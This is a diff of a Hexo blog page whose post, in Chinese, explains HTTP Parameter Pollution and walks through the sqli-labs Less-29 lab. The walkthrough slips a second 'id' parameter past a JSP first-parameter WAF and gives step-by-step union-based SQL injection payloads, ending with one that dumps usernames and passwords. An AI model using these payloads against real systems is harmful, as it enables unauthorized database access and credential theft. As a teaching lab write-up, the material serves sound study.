@@ -1,5 +1,68 @@
-<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1"><title>HTTP污染拙见</title><link rel="shortcut icon" href="/images/avatar.png"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css"><script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script></head><body><nav class="main-nav"><a href="/">Home</a><a href="/archives">Archives</a></nav><div class="profile"><section id="wrapper"><header id="header"><a href="/about"><img class="2x" id="avatar" src="/images/avatar.png"></a><h1>The clown is laughing at you</h1><h2></h2></header></section></div><section class="post" id="wrapper"><article><header><h1>HTTP污染拙见</h1><h2 class="headline">Mar 03, 2019 9:00·1.5k words
-·6 minutes read<span class="tags"></span></h2></header><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP污染介绍"><span class="toc-text">HTTP污染介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例子"><span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对客户端的攻击"><span class="toc-text">对客户端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对服务器端的攻击"><span class="toc-text">对服务器端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlilab-29"><span class="toc-text">sqlilab-29</span></a></li></ol></li></ol></div><section id="post-body"><p>在重新学习sqlilab时看到HTTP污染，之前没有好好理解悔不当初啊。</p>
+<!DOCTYPE html>
+<html lang=>
+  <head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="description" content="">
+  <meta name="keywords" content="root">
+  
+    <link rel="icon" href="/favicon.ico">
+  
+    
+  <title>HTTP污染拙见 | The clown is laughing at you</title>
+  <link rel="stylesheet" href="/style.css">
+  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
+  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+  <header>
+  <div class="header-container">
+    <a class='logo' href="/">
+      <span>The clown is laughing at you</span>
+    </a>
+    <ul class="right-header">
+      
+        <li class="nav-item">
+          
+            <a href="/" class="item-link">首页</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/about" class="item-link">关于</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/archives" class="item-link">归档</a>
+          
+        </li>
+      
+        <li class="nav-item">
+          
+            <a href="/tags" class="item-link">标签</a>
+          
+        </li>
+      
+    </ul>
+  </div>
+</header>
+
+  <main id='post'>
+  <div class="content">
+    <article>
+        <section class="content markdown-body">
+          <h1>HTTP污染拙见</h1>
+          <div class='post-meta'>
+            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/03/03</time>
+            
+            
+          </div>
+          <p>在重新学习sqlilab时看到HTTP污染，之前没有好好理解悔不当初啊。</p>
 <p>现在认真记录一下，重视基础<br>参考文章：<a href="https://blog.csdn.net/eatmilkboy/article/details/6761407" target="_blank" rel="noopener">https://blog.csdn.net/eatmilkboy/article/details/6761407</a></p>
 <h1 id="HTTP污染介绍"><a href="#HTTP污染介绍" class="headerlink" title="HTTP污染介绍"></a>HTTP污染介绍</h1><p>HPP是HTTP Parameter Pollution的缩写。这个漏洞由S. di Paola 与L. Caret Toni在2009年的OWASP上首次公布。这也是一种注入型的漏洞，攻击者通过在HTTP请求中插入特定的参数来发起攻击。如果Web应用中存在这样的漏洞，可以被攻击者利用来进行客户端或者服务器端的攻击。下面对这个漏洞的原理做一下详细解释。</p>
 <p>在跟服务器进行交互的过程中，客户端往往会在GET/POST请求里面带上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /foo?par1=val1&amp;par2=val2 HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /foo HTTP/1.1</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Host: Host</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 19</span><br></pre></td></tr></table></figure></p>
@@ -30,4 +93,165 @@
 <p>在此jsp服务器起到WAF的作用，jsp会接受第一个参数，php服务器会接受最后一个参数<br>所以我们构造如下payload:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">'--+</span></span><br></pre></td></tr></table></figure></p>
 <p>成功了</p>
 <p>接下来一步一步来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">判读字段数：?id=<span class="number">1</span>&amp;id=<span class="number">1</span><span class="string">' order by 3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断显示位：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> --+</span><br><span class="line"></span><br><span class="line">爆出数据库名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,database(),3 --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出表名：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">爆出字段名：?id=<span class="number">1</span>&amp;id=<span class="number">-1</span><span class="string">' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='</span>users<span class="string">'--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆出数据：?id=1&amp;id=-1'</span> union select <span class="number">1</span>,group_concat(username,<span class="string">"~"</span>,password,<span class="string">"~~~~"</span>),<span class="number">3</span> from users --+</span><br></pre></td></tr></table></figure></p>
-</section><nav id="post-nav"><span class="prev"><a href="/2019/03/05/XSS-反射型/"><span class="arrow">←</span>Newer Posts</a></span><span class="next"><a href="/2019/03/01/mysql基本使用与用户管理/">Older Posts<span class="arrow">→</span></a></span></nav></article></section><footer id="footer"><div id="social"><a class="symbol" href="https://github.com/fuzhouxxdong"><i class="fa fa-github"></i></a></div><p class="small">© Copyright 2018 &nbsp;<i class="fa fa-heart" aria-hidden="true">&nbsp;Dxx</i></p><p class="small">Powered by &nbsp;<a href="https://hexo.io/">Hexo &nbsp;</a>Theme By &nbsp;<a href="https://github.com/fuzhouxxdong/hexo-theme-dxx">Dxx</a></p></footer><script>hljs.initHighlightingOnLoad();</script></body></html>
+
+        </section>
+    </article>
+    
+        <!-- disqus 评论框 start -->
+        <div class="comment">
+            <div id="disqus_thread" class="disqus-thread">
+              <i>Loading comments box needs to over the wall</i>
+            </div>
+        </div>
+        <!-- disqus 评论框 end -->
+    
+    
+        <!-- livere 评论框 start -->
+        <div class="comment">
+            <div id="lv-container" data-id="city" data-uid="your_livere_uid"></div>
+        </div>
+        <!-- livere 评论框 end -->
+        
+  </div>
+  <aside>
+    
+    <div class="toc-container">
+        <h1>目录</h1>
+        <div class="content">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP污染介绍"><span class="toc-number">1.</span> <span class="toc-text">HTTP污染介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#例子"><span class="toc-number">2.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#对客户端的攻击"><span class="toc-number">2.1.</span> <span class="toc-text">对客户端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#对服务器端的攻击"><span class="toc-number">2.2.</span> <span class="toc-text">对服务器端的攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlilab-29"><span class="toc-number">2.3.</span> <span class="toc-text">sqlilab-29</span></a></li></ol></li></ol>
+        </div>
+    </div>
+    
+  </aside>
+</main>
+
+<!-- disqus 公共JS代码 -->
+<script type="text/javascript">
+  /* * * CONFIGURATION VARIABLES * * */
+  var disqus_shortname = "your_disqus_shortname";
+  var disqus_identifier = "http://yoursite.com/2019/03/03/HTTP污染拙见/";
+  var disqus_url = "http://yoursite.com/2019/03/03/HTTP污染拙见/";
+
+  isAgent(getDisqus)
+
+  // determine user agent in China
+  function isAgent(cb) {
+    var url = '//graph.facebook.com/feed?callback=h';
+    var xhr = new XMLHttpRequest();
+    var called = false;
+    xhr.open('GET', url);
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+      called = true;
+      cb(true);
+      }
+    };
+    xhr.send();
+    // timeout 1s, this facebook API is very fast.
+    setTimeout(function() {
+      if (!called) {
+      xhr.abort();
+      cb(false)
+      }
+    }, 1000);
+  }
+
+  function getDisqus(isAgent) {
+    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
+    dsq.async = true
+    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
+  }
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+<script type="text/javascript">
+  (function(d, s) {
+      var j, e = d.getElementsByTagName(s)[0];
+
+      if (typeof LivereTower === 'function') { return; }
+
+      j = d.createElement(s);
+      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+      j.async = true;
+
+      e.parentNode.insertBefore(j, e);
+  })(document, 'script');
+</script>
+
+
+  <footer>
+  <div class="copyright">
+    <div>
+      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
+    </div>
+    <div>
+      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
+    </div>
+  </div>
+</footer>
+
+
+<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+<script src="/lib/in-view.min.js"></script>
+<script src="/lib/lodash.min.js"></script>
+<script>
+  var isDown = true
+  var oldY = 0
+  inView.offset(50)
+
+  document.body.addEventListener('touchstart', function(){});
+  
+  window.addEventListener('scroll', _.throttle(e => {
+    var currentY = window.scrollY
+    if((oldY - currentY) < 0) {
+      isDown = true
+    } else {
+      isDown = false
+    }
+    oldY = currentY
+  }, 250))
+
+  $("article img").each(function() {
+      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
+      $(this).wrapAll(strA);
+  });
+
+  $('.toc-link').each(function() {
+      var href = $(this).attr("href");
+      
+      inView(href).on('exit', () => {
+        if (isDown) {
+          handleActive(href)
+        }
+      })
+
+      inView(href).on('enter', () => {
+        if (!isDown) {
+          handleActive(href)
+        }
+      })
+
+      this.onclick = function(e) {
+        var pos = $(href).offset().top - 10;
+        $("html,body").animate({scrollTop: pos}, 300);
+        setTimeout(() => {
+          handleActive(href)
+        }, 350)
+        return false
+      }
+  })
+
+  function handleActive(href) {
+    document.querySelectorAll('.toc-link').forEach(elm => {
+      elm.classList.remove('active')
+    })
+    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
+  }
+</script>
+<script src="/lib/jquery.fancybox.min.js"></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"live2d-xuexiaoban"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
